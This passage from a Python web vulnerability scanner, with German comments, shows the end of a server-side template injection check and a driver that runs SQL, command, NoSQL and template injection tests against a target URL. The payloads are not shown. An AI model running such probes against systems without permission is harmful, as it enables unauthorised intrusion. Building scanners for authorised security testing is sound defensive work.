                                "parameter": param,
                                "payload": payload,
                                "evidence": f"Template Evaluation gefunden: '{ind}' in Response.",
                                "remediation": "Templates sandboxen. User-Input niemals direkt in Templates rendern."
                            })
                            return findings
            except:
                continue
    
    if not findings:
        findings.append({
            "id": "SSTI-OK",
            "severity": "info",
            "type": "ssti",
            "title": "Keine SSTI gefunden",
            "url": target,
            "evidence": "SSTI Payloads (Jinja2, MVEL, ERB) getestet.",
            "remediation": "Weiterhin Templates sandboxen."
        })
    
    return findings


def scan(target):
    """Hauptfunktion - alle Injection-Tests"""
    print("[INJECTION SCANNER] Starte Injection-Tests...")
    all_findings = []
    
    all_findings.extend(scan_sql_injection(target))
    if any(f['severity'] == 'critical' for f in all_findings):
        return all_findings  # Sofort stoppen bei Critical
    
    all_findings.extend(scan_command_injection(target))
    if any(f['severity'] == 'critical' for f in all_findings):
        return all_findings
    
    all_findings.extend(scan_nosql_injection(target))
    if any(f['severity'] == 'critical' for f in all_findings):
        return all_findings
    
    all_findings.extend(scan_ssti(target))
    
    print(f"[INJECTION SCANNER] {len(all_findings)} Findings")
    return all_findings


if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        results = scan(sys.argv[1])
        print(json.dumps(results, indent=2))
